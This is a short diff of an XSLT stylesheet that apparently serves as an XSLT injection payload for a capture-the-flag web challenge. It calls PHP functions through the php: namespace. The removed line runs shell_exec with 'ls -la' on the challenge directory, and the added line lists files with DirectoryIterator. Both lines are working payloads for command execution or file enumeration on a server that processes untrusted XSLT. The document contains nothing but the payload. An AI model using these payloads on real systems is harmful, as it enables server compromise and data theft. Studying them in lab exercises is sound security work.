@@ -2,7 +2,7 @@
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
 <xsl:template match="/">
   <pre>
-    <xsl:value-of select="php:function('shell_exec', 'ls -la /challenge/web-serveur/ch50/')" />
+    <xsl:value-of select="php:function('implode', '&#10;', php:function('iterator_to_array', php:function('DirectoryIterator', '.')))"/>
   </pre>
 </xsl:template>
 </xsl:stylesheet>
